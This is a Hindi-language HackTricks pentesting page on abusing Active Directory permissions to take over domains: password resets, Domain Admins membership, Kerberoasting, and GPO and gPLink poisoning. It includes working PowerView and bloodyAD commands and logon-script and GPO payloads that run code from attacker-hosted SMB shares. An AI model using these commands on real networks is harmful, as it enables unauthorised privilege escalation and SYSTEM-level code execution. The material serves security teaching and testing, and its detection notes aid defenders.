# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्यतः इन** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **की तकनीकों का सारांश है। अधिक जानकारी के लिए, मूल लेख देखें।**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User पर GenericAll अधिकार**

यह privilege हमलावर को किसी target user account पर पूरा नियंत्रण देता है। `Get-ObjectAcl` command का उपयोग करके `GenericAll` अधिकारों की पुष्टि हो जाने पर, हमलावर:

- **Target का पासवर्ड बदल सकता है**: `net user <username> <password> /domain` का उपयोग करके, हमलावर user का पासवर्ड reset कर सकता है।
- Linux से, Samba `net rpc` के ज़रिए SAMR पर भी यही किया जा सकता है:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **यदि account disabled है, तो UAC flag हटाएँ**: `GenericAll` से `userAccountControl` को संपादित किया जा सकता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag हटा सकता है:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: यूज़र के अकाउंट को kerberoastable बनाने के लिए उसमें SPN असाइन करें, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes निकालें और उन्हें crack करने का प्रयास करें।

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: user के लिए pre-authentication disable करें, जिससे उनका account ASREPRoasting के प्रति vulnerable हो जाता है।

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` होने पर, आप certificate-based credential जोड़ सकते हैं और उसका password बदले बिना उसके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **समूह पर GenericAll अधिकार**

यह privilege attacker को group memberships में बदलाव करने देता है, यदि उसके पास `Domain Admins` जैसे group पर `GenericAll` rights हों। `Get-NetGroup` से group का distinguished name पता लगाने के बाद, attacker:

- **खुद को Domain Admins Group में जोड़ सकता है**: यह सीधे commands के ज़रिए या Active Directory या PowerSploit जैसे modules का इस्तेमाल करके किया जा सकता है।

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux से आप BloodyAD का उपयोग करके उन arbitrary groups में खुद को भी जोड़ सकते हैं जिनकी membership पर आपके पास GenericAll/Write अधिकार हैं। यदि target group “Remote Management Users” में nested है, तो आपको उन hosts पर तुरंत WinRM access मिल जाएगा जो उस group को मान्यता देते हैं:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से आप:

- **Kerberos Resource-based Constrained Delegation**: computer object का takeover कर सकते हैं।
- **Shadow Credentials**: shadow credentials बनाने के privilege का दुरुपयोग करके computer या user account का impersonation कर सकते हैं।

## किसी object को inherited OU permissions के दायरे में ले जाना

एक path में **किसी account को move करने के rights** और **destination OU से inherited write rights** को जोड़ा जा सकता है, भले ही शुरुआत में कोई भी principal account के sensitive attributes को modify न कर सके। Source object की move permissions और destination पर `CreateChild` की जाँच करें, object को move करें, फिर उसकी effective DACL दोबारा जाँचें। उदाहरण के लिए, powerview.py का `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` user को move करता है; उस OU पर inherited `GenericWrite` वाला controlled group फिर [shadow credential](shadow-credentials.md) जोड़ सकता है। Move करने से अपने-आप inherited right नहीं मिलता।<sup>[[18]](#references)</sup>

अगर आपके पास किसी OU पर `GenericAll` है, लेकिन उपयुक्त inherited ACE नहीं है, तो `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` उसके descendants के लिए एक ACE जोड़ सकता है। Target account को अलग से जाँचें: **AdminSDHolder-protected accounts में inheritance disabled होती है**, इसलिए OU ACE सामान्य users पर असर डाल सकता है, लेकिन protected user पर नहीं। [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group) देखें।<sup>[[18]](#references)</sup>

दुरुपयोग का एक अलग path तब मौजूद होता है, जब कोई privileged scheduled cleanup script attacker के नियंत्रण वाले ACEs के आधार पर OUs चुनती है, और फिर उनके descendants पर `Set-ADObject -Clear adminCount` **और** `$acl.SetAccessRuleProtection($False, $False)` चलाती है। अगर आप OU DACL modify कर सकते हैं, तो script द्वारा जाँचे जाने वाले group को आवश्यक `ExtendedRight` या `GenericAll` ACE दें; अलग से यह भी जाँचें कि आप task चला सकते हैं। इसके बाद privileged task किसी पहले से protected account पर inheritance बहाल कर सकता है, जिससे OU ACE लागू हो सके। सटीक script, उसे trigger करने की permission और परिणामी DACL की पुष्टि करें; केवल `adminCount` clear करने से inheritance फिर से enabled नहीं होती, और protected groups में बने रहने वाले accounts को SDProp दोबारा protect कर सकता है।<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

अगर किसी user के पास किसी specific group (जैसे `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वह:

- **खुद को Domain Admins Group में जोड़ सकता है**: `net user` और `Add-NetGroupUser` commands को मिलाकर यह तरीका domain के भीतर privilege escalation की अनुमति देता है।

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Group पर Self (Self-Membership)**

यह विशेषाधिकार हमलावरों को ऐसे commands के ज़रिए खुद को विशिष्ट groups, जैसे `Domain Admins`, में जोड़ने की अनुमति देता है, जो सीधे group membership में बदलाव करते हैं। निम्न command sequence का उपयोग करके वे खुद को group में जोड़ सकते हैं:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

एक समान privilege, यह attackers को उन groups की properties में बदलाव करके सीधे स्वयं को groups में जोड़ने की अनुमति देता है, यदि उनके पास उन groups पर `WriteProperty` right हो। इस privilege की पुष्टि और execution इनके ज़रिए किए जाते हैं:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होने से, मौजूदा password जाने बिना password reset किया जा सकता है। इस अधिकार की पुष्टि और इसका exploit PowerShell या वैकल्पिक command-line tools के ज़रिए किया जा सकता है। इनमें user का password reset करने के कई तरीके शामिल हैं, जैसे interactive sessions और non-interactive environments के लिए one-liners। ये commands साधारण PowerShell invocations से लेकर Linux पर `rpcclient` के इस्तेमाल तक के विकल्प दिखाते हैं और attack vectors की बहुमुखी प्रतिभा दर्शाते हैं।

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **Group पर WriteOwner**

यदि किसी attacker को किसी group पर `WriteOwner` अधिकार मिले हैं, तो वह group का ownership बदलकर अपने नाम कर सकता है। यह खास तौर पर तब प्रभावशाली होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group के attributes और membership पर अधिक नियंत्रण मिलता है। इस प्रक्रिया में `Get-ObjectAcl` का उपयोग करके सही object की पहचान की जाती है, फिर SID या नाम के आधार पर owner बदलने के लिए `Set-DomainObjectOwner` का उपयोग किया जाता है।

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite on User**

यह permission attacker को user की properties संशोधित करने देती है। विशेष रूप से, `GenericWrite` access के साथ attacker, user के logon पर malicious script execute करने के लिए उसकी logon script path बदल सकता है। इसके लिए `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को attacker की script पर point करने के लिए update किया जाता है।

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

एक अधिक सीमित `WriteProperty` ACE, जो उपयोगकर्ता के [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) तक सीमित हो, पर्याप्त हो सकता है; `GenericWrite` आवश्यक नहीं है। उस attribute अधिकार को domain के `SYSVOL\<domain>\scripts` या `NETLOGON` tree में किसी writable script के साथ जोड़ें, फिर आकलन करें कि लक्षित उपयोगकर्ता के लॉग ऑन करके उस script तक पहुँचने की संभावना है या नहीं। लॉग ऑन होने पर script उस उपयोगकर्ता के context में चलता है। प्रभावी AD और file/share ACLs की अलग-अलग समीक्षा करें; केवल मेल खाता Allow ACE या writable directory, पूरी राह की पुष्टि नहीं करता।

## **GenericWrite on Group**

इस privilege से attackers group membership में बदलाव कर सकते हैं, जैसे खुद को या अन्य उपयोगकर्ताओं को विशिष्ट groups में जोड़ना। इस प्रक्रिया में credential object बनाना, उसका उपयोग करके उपयोगकर्ताओं को किसी group में जोड़ना या उससे हटाना, और PowerShell commands से membership में हुए बदलावों की पुष्टि करना शामिल है।

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux से, समूह पर `GenericWrite` अधिकार होने पर Samba `net` सदस्य जोड़/हटा सकता है (जब PowerShell/RSAT उपलब्ध न हों, तब उपयोगी):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` विशेषाधिकार होना, हमलावर को उस ऑब्जेक्ट पर `GenericAll` विशेषाधिकार देने में सक्षम बनाता है। यह ADSI में बदलाव करके किया जाता है, जिससे ऑब्जेक्ट पर पूरा नियंत्रण मिलता है और उसकी group memberships में बदलाव किया जा सकता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन विशेषाधिकारों का फायदा उठाने की कोशिश करते समय कुछ सीमाएँ होती हैं।<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner से त्वरित takeover (PowerView)

जब किसी user या service account पर आपके पास `WriteOwner` और `WriteDacl` हों, तो आप पुराना password जाने बिना PowerView का उपयोग करके उसका पूरा नियंत्रण ले सकते हैं और उसका password reset कर सकते हैं:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

नोट:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को बदलकर खुद को owner बनाना पड़ सकता है:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Password reset के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।

## **Domain पर Replication (DCSync)**

DCSync attack, Domain Controller की नकल करने और user credentials सहित data synchronize करने के लिए domain पर मौजूद खास replication permissions का लाभ उठाता है। इस शक्तिशाली technique के लिए `DS-Replication-Get-Changes` जैसी permissions की ज़रूरत होती है, जिनकी मदद से attackers Domain Controller तक सीधे access किए बिना AD environment से sensitive जानकारी निकाल सकते हैं।<sup>[[5]](#references)</sup> [**DCSync attack के बारे में यहाँ और जानें।**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access गंभीर security risks पैदा कर सकता है। उदाहरण के लिए, अगर `offense\spotless` जैसे user को GPO management rights delegate किए गए हों, तो उसे **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges मिल सकती हैं। इन permissions का malicious उद्देश्यों के लिए दुरुपयोग किया जा सकता है। PowerView का उपयोग करके इनकी पहचान इस तरह की जा सकती है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions की Enumeration

गलत configuration वाले GPOs की पहचान करने के लिए PowerSploit के cmdlets को chain किया जा सकता है। इससे उन GPOs का पता लगाया जा सकता है जिन्हें manage करने की permissions किसी खास user के पास हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**दिए गए Policy वाले Computers**: यह पता लगाया जा सकता है कि कोई खास GPO किन computers पर लागू होता है, जिससे संभावित प्रभाव का दायरा समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी दिए गए Computer पर लागू Policies**: किसी खास computer पर लागू policies देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**दिए गए Policy वाले OUs**: किसी policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

GPOs की enumeration करने और उनमें मौजूद समस्याओं का पता लगाने के लिए [**GPOHound**](https://github.com/cogiceo/GPOHound) tool का भी उपयोग कर सकते हैं।

### Abuse GPO - New-GPOImmediateTask

गलत configuration वाले GPOs का code execute करने के लिए दुरुपयोग किया जा सकता है, उदाहरण के लिए, एक immediate scheduled task बनाकर। इससे प्रभावित machines पर किसी user को local administrators group में जोड़ा जा सकता है, जिससे उसकी privileges में काफ़ी बढ़ोतरी होती है:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

यदि GroupPolicy module इंस्टॉल है, तो यह नए GPO बनाने और उन्हें लिंक करने तथा प्रभावित कंप्यूटरों पर backdoors चलाने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। इस तरीके में GPO को अपडेट करना और execution के लिए किसी user का कंप्यूटर पर लॉग इन करना आवश्यक है:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse मौजूदा GPOs में tasks जोड़कर या settings में बदलाव करके उनका दुरुपयोग करने का तरीका प्रदान करता है, और इसके लिए नए GPOs बनाने की आवश्यकता नहीं होती। इस tool के लिए बदलाव लागू करने से पहले मौजूदा GPOs में संशोधन करना या नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### नीति अपडेट बलपूर्वक लागू करना

GPO अपडेट आमतौर पर हर 90 मिनट के आसपास होते हैं। इस प्रक्रिया को तेज़ करने के लिए, खासकर कोई बदलाव लागू करने के बाद, लक्ष्य कंप्यूटर पर `gpupdate /force` कमांड चलाकर तुरंत नीति अपडेट कराया जा सकता है। इससे GPO में किए गए बदलाव अगले स्वचालित अपडेट चक्र की प्रतीक्षा किए बिना लागू हो जाते हैं।

### अंदरूनी कार्यप्रणाली

किसी GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की जाँच करने पर `evilTask` जैसे कार्य जोड़े जाने की पुष्टि की जा सकती है। ये कार्य ऐसी स्क्रिप्ट या कमांड-लाइन टूल के ज़रिए बनाए जाते हैं जिनका उद्देश्य सिस्टम के व्यवहार में बदलाव करना या विशेषाधिकार बढ़ाना होता है।

`New-GPOImmediateTask` से बनाई गई XML कॉन्फ़िगरेशन फ़ाइल में कार्य की संरचना और उसके विवरण दिए होते हैं—जैसे चलाया जाने वाला कमांड और उसके ट्रिगर। यह फ़ाइल दिखाती है कि GPO में Scheduled Tasks कैसे परिभाषित और प्रबंधित किए जाते हैं, और नीति लागू करते समय मनमाने कमांड या स्क्रिप्ट चलाने का तरीका प्रदान करती है।

### उपयोगकर्ता और समूह

GPO लक्ष्य सिस्टम पर उपयोगकर्ताओं और समूहों की सदस्यता में बदलाव करने की सुविधा भी देते हैं। Users and Groups नीति फ़ाइलों को सीधे संपादित करके, हमलावर उपयोगकर्ताओं को विशेषाधिकार वाले समूहों, जैसे स्थानीय `administrators` समूह, में जोड़ सकते हैं। GPO प्रबंधन अनुमतियों का प्रत्यायोजन इसकी अनुमति देता है: इससे नीति फ़ाइलों में नए उपयोगकर्ता जोड़े जा सकते हैं या समूह सदस्यताएँ बदली जा सकती हैं।

Users and Groups की XML कॉन्फ़िगरेशन फ़ाइल बताती है कि ये बदलाव कैसे लागू किए जाते हैं। इस फ़ाइल में प्रविष्टियाँ जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित सिस्टम पर उन्नत विशेषाधिकार दिए जा सकते हैं। यह GPO में बदलाव करके विशेषाधिकार बढ़ाने का सीधा तरीका है।

स्थानीय समूह सदस्यता और उपयोगकर्ता अधिकार जैसी सुरक्षा सेटिंग्स के लिए, लागू GPO टेम्पलेट `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` और `SecEdit` डायरेक्टरी के ACL की भी जाँच करें। लिखने योग्य डायरेक्टरी या फ़ाइल जाँच के लिए एक संकेत है: बदलाव प्रभावी हो सकता है या नहीं, यह अंततः SYSVOL शेयर की प्रभावी पहुँच, deny और inherited ACLs, Group Policy container की अनुमतियों, नीति के दायरे और क्लाइंट के रीफ़्रेश पर निर्भर करता है। केवल “GPO Managers” नाम के समूह की सदस्यता से संपादन अधिकार सिद्ध नहीं होते। [Microsoft इस टेम्पलेट पथ और Group Policy container/template के विभाजन का दस्तावेज़ देता है।](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

इसके अलावा, कोड चलाने या persistence बनाए रखने के अन्य तरीकों पर भी विचार किया जा सकता है—जैसे logon/logoff scripts का उपयोग करना, autoruns के लिए registry keys में बदलाव करना, `.msi` फ़ाइलों के ज़रिए सॉफ़्टवेयर इंस्टॉल करना या service configurations संपादित करना। ये तकनीकें GPO के दुरुपयोग से पहुँच बनाए रखने और लक्ष्य सिस्टम को नियंत्रित करने के कई तरीके देती हैं।

### प्रमाणीकृत rogue services की ओर GPC/GPT retrieval को redirect करना

GPO में मेटाडेटा वाला LDAP **Group Policy Container (GPC)** और नीति फ़ाइलों वाला SMB-hosted **Group Policy Template (GPT)** होता है। रीफ़्रेश के दौरान, क्लाइंट container के `gPLink` का अनुसरण करता है, संदर्भित GPC और उसका `gPCFileSysPath` पढ़ता है, फिर उस UNC path से GPT डाउनलोड करता है। इसलिए, स्वयं GPC या किसी OU, Site अथवा Domain के `gPLink` पर लिखने की पहुँच को विशेषाधिकारयुक्त नीति प्रसंस्करण में बदला जा सकता है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity के साथ `gPCFileSysPath` poisoning

यदि नियंत्रित principal लक्ष्य GPC में लिख सकता है (सीधे या **NTLM relay to LDAP** के ज़रिए), तो `gPCFileSysPath` को हमलावर द्वारा होस्ट किए गए UNC path से बदल दें। [GPOddity](https://github.com/synacktiv/GPOddity) LDAP बदलाव को स्वचालित करता है और एक दुर्भावनापूर्ण GPT होस्ट करता है, जिसमें module-based policy files या Immediate Task होता है, जिसे Group Policy client `NT AUTHORITY\SYSTEM` के रूप में चलाता है।<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

मौजूदा Windows क्लाइंट पर anonymous या credential-agnostic SMB share पर्याप्त नहीं है: SMB Secure Negotiate के लिए यह प्रमाण आवश्यक है कि प्रमाणीकरण सफल हुआ था। इसलिए rogue service को domain identity सत्यापित करनी होगी, SMB session key प्राप्त करनी होगी और अपने responses पर सही ढंग से हस्ताक्षर करने होंगे। embedded mode में, GPOddity को नियंत्रित machine account और उसकी service key के साथ कॉन्फ़िगर करें, फिर `[COMMANDS]` सेक्शन में computer-side या user-side payload चुनें।<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO edge case:** MS16-072 के बाद भी, Windows उसी **TCP connection** में दो SMB2 sessions बनाता है: user session `GPT.INI` पढ़ता है, फिर computer-account session `ScheduledTasks.xml` जैसी effective configuration पढ़ता है। इसलिए rogue server को authentication state, session keys और signing keys को केवल socket के आधार पर नहीं, बल्कि SMB2 `SessionId` के आधार पर index करना चाहिए। GPOddity/OUned में embedded Scapy fork, `SMBStreamSocketMultiplexing` और multiplexing-aware `SMBServer` के ज़रिए यह काम करता है; single-session Impacket/Scapy servers अन्यथा गलत signing state का फिर से इस्तेमाल करते हैं और user policies पर विफल हो जाते हैं।<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

किसी OU, Site या Domain पर `WriteGPLink`, `GenericWrite` या equivalent control होने पर, attacker ऐसा link जोड़ सकता है जिसका GPC DN, attacker-controlled LDAP host से serve किया जाता है। यह primitive मूल रूप से Petros Koutroumpis ने प्रस्तुत किया था; [OUned](https://github.com/synacktiv/OUned) LDAP write और malicious GPC/GPT chain को automate करता है।<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

पीड़ित पहले rogue LDAP service से authenticate करता है और एक GPC प्राप्त करता है, जिसका `gPCFileSysPath` rogue SMB service की ओर इंगित करता है; फिर यह SMB से authenticate करता है और दिया गया GPT लागू करता है। इसलिए OUned को LDAP SPN वाला एक account, SMB के लिए HOST SPN वाला एक machine account (एक ही machine account दोनों ज़रूरतें पूरी कर सकता है), और ऐसा DNS resolution या reverse forwarding चाहिए जो ports 389 और 445 को operator host पर भेजे।<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned का embedded Scapy LDAP server, असली नियंत्रित service key के साथ Kerberos/SPNEGO को validate करता है और JSON से मनमाना GPC data serve करता है। खाली JSON key, rootDSE को दर्शाती है; `base64:` prefixes binary values दर्शाते हैं; और server, add/delete/modify/search के साथ `BASE`, `LEVEL` और `SUBTREE` searches को support करता है। यह बिना protection, integrity या confidentiality के साथ negotiate कर सकता है। इससे यह service तब दोबारा इस्तेमाल की जा सकती है, जब कोई अन्य Windows component attacker-controlled LDAP reference को follow करे, लेकिन authenticated LDAP की मांग करे।<sup>[[15]](#references)</sup>

यह न मानें कि किसी account का password dummy domain में synchronize करने से Kerberos की हर key दोबारा बन जाती है: RC4, password से derive होता है, जबकि AES string-to-key में principal के hostname/domain से derive किया गया salt भी इस्तेमाल होता है। `KerberosSSP` को असली account AES key देने से, machine account के अपने-आप लिखे जा सकने वाले `msDS-SupportedEncryptionTypes` में ऐसा detect होने वाला बदलाव करके RC4 को मजबूर करने की जरूरत नहीं पड़ती।<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` या `gPLink` में हुए बदलावों का, GPO version में बदलाव और नए Immediate/Scheduled Task XML के साथ मिलान करें। ऐसे links की जांच करें जो अनपेक्षित naming contexts, स्वीकृत DC/SYSVOL सेट से बाहर के UNC hosts, machine-account names को redirect करने वाले DNS records, असामान्य machine accounts के LDAP/CIFS service tickets और RC4 enable करने वाले `msDS-SupportedEncryptionTypes` बदलावों की ओर संकेत करते हों।<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain पर `WriteGPLink` होने से आप target container का `gPLink` attribute बदल सकते हैं और GPO को edit किए बिना **मौजूदा GPO को लागू होने के लिए बाध्य** कर सकते हैं। यह तब खास तौर पर दिलचस्प हो जाता है, जब linked GPO पहले से **UNC paths** (`\\HOST\share\...`) के ज़रिए remote content को reference करता हो, क्योंकि authenticated users **SYSVOL** पढ़ सकते हैं और दोबारा इस्तेमाल की जा सकने वाली policies को offline खोज सकते हैं।<sup>[[11]](#references)</sup>

उच्च-स्तरीय workflow:

1. BloodHound का उपयोग करके उस principal की पहचान करें जिसके पास किसी OU पर `WriteGPLink` है, और उस OU के भीतर के computers/users की सूची बनाएं।
2. `SYSVOL` की read-only copy बनाएं और GPOs को parse करके **Software Installation**, **drive mappings** (`Drives.xml`) और UNC paths को reference करने वाली **logon/startup scripts** खोजें।
3. ऐसे policies को प्राथमिकता दें जो DFS/domain-namespace paths के बजाय **सीधे hostname** की ओर संकेत करती हों (उदाहरण के लिए `\\DC02\share\pkg.msi`), क्योंकि L2 spoofing से hostname-based paths को redirect करना आसान होता है।
4. चुने गए GPO GUID को target OU के `gPLink` में जोड़ें, ताकि victim उस पहले से मौजूद policy को process करे।
5. उसी broadcast domain पर UNC host को ARP spoof करें और उसका IP स्थानीय रूप से bind करें (`ip addr add <target_ip>/32 dev <iface>`), ताकि victim का SMB traffic आपके host तक पहुंचे।
6. attacker SMB server (उदाहरण के लिए `smbserver.py`) से अपेक्षित path/filename serve करें और सामान्य policy processing का इंतज़ार करें।

उदाहरण: `SYSVOL` collection और GPO correlation:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

मौजूदा GPO को लक्षित OU से लिंक करें:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

अगर लिंक किया गया GPO किसी UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करेगा और **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। referenced host को spoof करके और **same share/path/name** के तहत malicious MSI serve करके, आप **SYSVOL में बदलाव किए बिना** `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

महत्वपूर्ण सीमाएँ:

- **Timing matters**: नया link policy refresh पर दिखाई देता है (आमतौर पर ~90 minutes बाद), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
